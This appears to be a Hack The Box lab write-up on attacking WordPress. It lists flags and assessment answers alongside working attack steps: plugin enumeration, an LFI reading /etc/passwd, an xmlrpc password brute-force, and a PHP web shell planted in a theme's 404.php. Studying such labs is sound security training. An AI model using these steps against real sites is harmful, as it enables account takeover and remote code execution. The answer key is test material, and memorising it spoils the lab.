# Directory Indexing

Answer: HTB{3num3r4t10n_15_k3y}

Explanation: Enumerate:
Command: ffuf -u "http://94.237.54.116:34546/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt

Enumeration: http://94.237.54.116:34546/wp-content/plugins/mail-masta/inc/flag.txt

# Login

Answer: 80

Explanation: 
```
POST /xmlrpc.php HTTP/1.1
Host: 94.237.54.116:34546
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 91

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

# WPScan Enumeration

Answer: 1.5.34

Explanation:  Command: wpscan --url http://94.237.59.197:43174/  --plugins-version-detection mixed

# Exploting a Vulnerable Plugin (LFI)

Answer: sally.jones

Explanation: URL: view-source:http://94.237.59.197:43174//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

# Attacking WordPress Users

Explanation: wpscan --password-attack xmlrpc -t 20 -U roger  -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt --url http://94.237.59.197:43174/

# RCE via Theme Editor

Answer: HTB{rc3_By_d3s1gn} 

Explanation: 
Put system($_GET['cmd']); this to the file Theme Edits to the page 404.php

Access: http://94.237.59.197:43174/wp-content/themes/twentyseventeen/404.php?cmd=cat%20../../../../../../home/wp-user/flag.txt

# Skills Assessment

Identify the WordPress version number.
5.1.6
+ 3  Identify the WordPress theme in use.
twentynineteen
+ 3  Submit the contents of the flag file in the directory with directory listing enabled.
HTB{d1sabl3_d1r3ct0ry_l1st1ng!}
+ 1  Identify the only non-admin WordPress user. (Format: <first-name> <last-name>)
Charlie Wiggins
+ 1  Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.
HTB{unauTh_d0wn10ad!}
+ 1  What is the version number of the plugin vulnerable to an LFI?
1.1.1
+ 1  Use the LFI to identify a system user whose name starts with the letter "f".
frank.mclane
+ 1  Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.
HTB{w0rdPr355_4SS3ssm3n7}
